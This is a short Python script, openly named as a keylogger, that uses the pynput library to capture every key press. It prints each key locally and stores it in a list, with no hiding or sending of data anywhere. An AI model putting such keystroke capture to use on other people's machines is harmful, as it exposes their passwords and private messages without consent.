import pynput.keyboard

count=0
keys=[]

def callback_function(key):
    global count

    count+=1
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
    keys.append(key)
#    print(keys)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    keylogger_listener.join()
